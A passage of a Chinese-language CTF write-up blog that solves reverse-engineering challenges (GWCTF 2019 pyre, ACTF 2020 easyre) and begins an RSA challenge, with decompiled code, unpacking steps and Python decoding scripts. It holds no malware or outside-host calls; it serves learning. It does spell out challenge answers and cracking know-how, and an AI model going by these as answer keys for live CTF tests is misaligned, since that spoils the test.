punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	flag <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">0x1F</span> <span class="token operator">-</span> i<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">0x1F</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	<span class="token builtin">str</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> flag</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	<span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> end <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220331203312196.png" alt="image-20220331203312196" /></p>
<h2 id="gwctf-2019pyre"><a class="anchor" href="#gwctf-2019pyre">#</a> [GWCTF 2019]pyre</h2>
<p>得到的 flag 请包上 flag {} 提交。</p>
<p>附件下载.pyc 文件，第一反应 pyc 反编译</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220401192813662.png" alt="image-20220401192813662" /></p>
<p>得到.py 文件</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># uncompyle6 version 3.8.0</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># Python bytecode 2.7 (62211)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment"># Decompiled from: Python 3.7.0 (default, Jun 28 2018, 08:04:48) [MSC v.1912 64 bit (AMD64)]</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment"># Embedded file name: encode.py</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment"># Compiled at: 2019-08-19 21:01:57</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">print</span> <span class="token string">'Welcome to Re World!'</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">print</span> <span class="token string">'Your input1 is your flag~'</span></pre></td></tr><tr><td data-num="8"></td><td><pre>l <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>input1<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>input1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span> <span class="token operator">+</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    code <span class="token operator">+=</span> num</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> code<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">print</span> code</pre></td></tr><tr><td data-num="17"></td><td><pre>code <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'\x1f'</span><span class="token punctuation">,</span> <span class="token string">'\x12'</span><span class="token punctuation">,</span> <span class="token string">'\x1d'</span><span class="token punctuation">,</span> <span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'\x01'</span><span class="token punctuation">,</span> <span class="token string">'\x06'</span><span class="token punctuation">,</span> <span class="token string">'\x14'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">','</span><span class="token punctuation">,</span> <span class="token string">'\x1b'</span><span class="token punctuation">,</span> <span class="token string">'U'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">'\x01'</span><span class="token punctuation">,</span> <span class="token string">'D'</span><span class="token punctuation">,</span> <span class="token string">';'</span><span class="token punctuation">,</span> <span class="token string">'%'</span><span class="token punctuation">,</span> <span class="token string">'\x13'</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token comment"># okay decompiling .\attachment.pyc</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220401192927020.png" alt="image-20220401192927020" /></p>
<p>关于异或，我们要知道这样一个技巧：</p>
<p><code>a ^ 0 = a</code> ， <code>a ^ a = 0</code> ，那么可得： <code>a ^ b ^ a = b</code> ， <code>a ^ b ^ b = a</code> 。</p>
<p>在这个题目当中，13、14 行使 <code>code[i] = code[i] ^ code[i + 1]</code> ， <code>i</code>  从 <code>0</code>  取到 <code>l - 1</code>  -  <code>1</code> 。处理后， <code>code[l - 1]</code>  没有变，那么要逆向，则令 x 从 <code>l - 2</code>  取到 <code>0</code> ，使 <code>code[x] = code[x] ^ code[x + 1]（a ^ b ^ b = a)</code> 。关于取模， <code>(a % c + b % c) % c = (a + b) % c</code> ，所以第 10 行等价于 <code>(input1[i] + i) % 128</code> 。</p>
<p>简单分析一下逻辑后，直接编写脚本</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>code <span class="token operator">=</span> <span class="token punctuation">[</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token string">'\x1f'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token string">'\x12'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token string">'\x1d'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token string">'('</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token string">'0'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token string">'4'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token string">'\x01'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token string">'\x06'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token string">'\x14'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token string">'4'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token string">','</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token string">'\x1b'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token string">'U'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token string">'?'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token string">'o'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token string">'6'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token string">'*'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token string">':'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token string">'\x01'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token string">'D'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token string">';'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token string">'%'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token string">'\x13'</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre>l <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Welcome to Re World!'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>code<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>code<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span> <span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>code<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> i<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>得到 flag，套上 flag 提交即可。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220401194948338.png" alt="image-20220401194948338" /></p>
<h2 id="actf新生赛2020easyre"><a class="anchor" href="#actf新生赛2020easyre">#</a> [ACTF 新生赛 2020] easyre</h2>
<p>得到的 flag 请包上 flag {} 提交。</p>
<p>附件下载 PEID 查壳</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220402201628111.png" alt="image-20220402201628111" /></p>
<p>upx 压缩壳，用 upx 脱壳</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220402201925429.png" alt="image-20220402201925429" /></p>
<p>完成脱壳后用 32 位 ida 打开</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220402204420974.png" alt="image-20220402204420974" /></p>
<p>f5 反编译：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  _BYTE v4<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+12h] [ebp-2Eh] BYREF</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  _DWORD v5<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+1Eh] [ebp-22h]</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  _BYTE v6<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+2Ah] [ebp-16h] BYREF</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [esp+2Fh] [ebp-11h]</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// [esp+33h] [ebp-Dh]</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// [esp+37h] [ebp-9h]</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token keyword">char</span> v10<span class="token punctuation">;</span> <span class="token comment">// [esp+3Bh] [ebp-5h]</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+3Ch] [ebp-4h]</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token function">__main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  <span class="token function">qmemcpy</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> <span class="token string">"*F'\"N,\"(I?+@"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> v6<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v6<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">65</span> <span class="token operator">||</span> v6<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">67</span> <span class="token operator">||</span> v6<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">84</span> <span class="token operator">||</span> v6<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">70</span> <span class="token operator">||</span> v6<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">123</span> <span class="token operator">||</span> v10 <span class="token operator">!=</span> <span class="token number">125</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>  v5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>  v5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>  v5<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> v9<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">11</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> _data_start__<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v5 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You are correct!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>关键函数为这个 for 循环</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">11</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> _data_start__<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v5 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>跟进 <code>_data_start__</code> 查看</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">.</span>data<span class="token operator">:</span><span class="token number">00402000</span> __data_start__  db <span class="token number">7</span>Eh                  <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> _main<span class="token operator">+</span>EC↑r</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>data<span class="token operator">:</span><span class="token number">00402001</span> aZyxwvutsrqponm db '<span class="token punctuation">&#125;</span><span class="token operator">|</span><span class="token punctuation">&#123;</span>zyxwvutsrqponmlkjihgfedcba`_<span class="token operator">^</span><span class="token punctuation">]</span>\<span class="token punctuation">[</span>ZYXWVUTSRQPONMLKJIHGFEDCBA@<span class="token operator">?</span><span class="token operator">>=</span>'</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">.</span>data<span class="token operator">:</span><span class="token number">00402001</span>                 db <span class="token char">'&lt;;:9876543210/.-,+*)('</span><span class="token punctuation">,</span><span class="token number">27</span>h<span class="token punctuation">,</span><span class="token char">'&amp;%$# !"'</span><span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220402202332503.png" alt="image-20220402202332503" /></p>
<p>hex-view 查看</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220402202424716.png" alt="image-20220402202424716" /></p>
<p>将 <code>_data_start__</code> 中的字符串与 <code>v4</code>  进行对比</p>
<p>而根据前面的分析可以看到 v4 的字符串为</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">*</span>F'\"N<span class="token punctuation">,</span>\"<span class="token punctuation">(</span>I?<span class="token operator">+</span>@</pre></td></tr></table></figure><p>也即</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>2a <span class="token number">46</span> <span class="token number">27</span> <span class="token number">22</span> 4E 2C <span class="token number">22</span> <span class="token number">28</span> 49h 3Fh 2Bh 40h</pre></td></tr></table></figure><p>如此就可写出解码脚本</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># -*- coding:utf-8 -*-</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>v4 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'2a'</span><span class="token punctuation">,</span><span class="token string">'46'</span><span class="token punctuation">,</span><span class="token string">'27'</span><span class="token punctuation">,</span><span class="token string">'22'</span><span class="token punctuation">,</span><span class="token string">'4E'</span><span class="token punctuation">,</span><span class="token string">'2C'</span><span class="token punctuation">,</span><span class="token string">'22'</span><span class="token punctuation">,</span><span class="token string">'28'</span><span class="token punctuation">,</span><span class="token string">'49'</span><span class="token punctuation">,</span><span class="token string">'3F'</span><span class="token punctuation">,</span><span class="token string">'2B'</span><span class="token punctuation">,</span><span class="token string">'40'</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="4"></td><td><pre>key <span class="token operator">=</span> <span class="token string">'~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=&lt;;:9876543210/.-,+*)(\'&amp;%$# !"'</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">#' 一定要加 \</span></pre></td></tr><tr><td data-num="6"></td><td><pre>x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="7"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">''</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> v4<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    x<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token comment"># v4 = [42,70,39,34,78,44,34,40,73,63,43,64]</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> x<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>key<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'ACTF&#123;'</span><span class="token operator">+</span>flag<span class="token operator">+</span><span class="token string">'&#125;'</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>得到 flag</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220403123630944.png" alt="image-20220403123630944" /></p>
<h2 id="rsa"><a class="anchor" href="#rsa">#</a> rsa</h2>
<p>ras 是一个非常神秘的算法，那么它神秘在哪里 请少侠自己摸索！ 注意：得到的 flag 请包上 flag {} 提交</p>
<p>附件，emmmm，熟悉 rsa 的都知道这是 rsa 中的公钥解密</p>
<p><strong>公钥 n = p * q，其中 p 和 q 是两个大素数</strong></p>
<p><strong>e 是随机选择的数，作为公钥</strong></p>
<p><strong>d 是跟 e 有关的一个数，满足条件式：ed=1（mod phi（n））</strong></p>
<p><strong>phi（n）是欧拉函数，phi（n）=（p-1）（q-1）</strong></p>
<p>pub.key 是公钥，flag.enc 是 rsa 加密后的文件，因此我们只要通过公钥文件解析出 n,e,p,q,d，再利用脚本解密 rsa 加密文件。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220403123957184.png" alt="image-20220403123957184" /></p>
<p>pub.key</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>BEGIN PUBLIC KEY<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span></pre></td></tr><tr><td data-num="2"></td><td><pre>MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMAzLFxkrkcYL2wch21CM2kQVFpY9<span class="token operator">+</span><span class="token number">7</span><span class="token operator">+</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">/</span>AvKr1rzQczdAgMBAAE<span class="token operator">=</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>END PUBLIC KEY<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span></pre></td></tr></table></figure><p>flag.enc</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>A柪YJ<span class="token operator">^</span> </pre></td></tr><tr><td data-num="2"></td><td><pre>柛x秥?y<span class="token punctuation">[</span>蔜?旭?緃沚</pre></td></tr></table></figure><p>公钥解析：<span class="exturl" data-url="aHR0cDovL3Rvb2wuY2hhY3VvLm5ldC9jcnlwdHJzYWtleXBhcnNl">http://tool.chacuo.net/cryptrsakeyparse</span></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>key长度：	<span class="token number">256</span></pre></td></tr><tr><td data-num="2"></td><td><pre>模数：</pre></td></tr><tr><td data-num="3"></td><td><pre>	十六进制：C0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDD</pre></td></tr><tr><td data-num="4"></td><td><pre>    十进制：<span class="token number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span></pre></td></tr><tr><td data-num="5"></td><td><pre>指数：	<span class="token number">65537</span> <span class="token punctuation">(</span><span class="token number">0x10001</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220403130045581.png" alt="image-20220403130045581" /></p>
<p>模数解析：<span class="exturl" data-url="aHR0cDovL3d3dy5mYWN0b3JkYi5jb20vaW5kZXgucGhw">http://www.factordb.com/index.php</span></p>
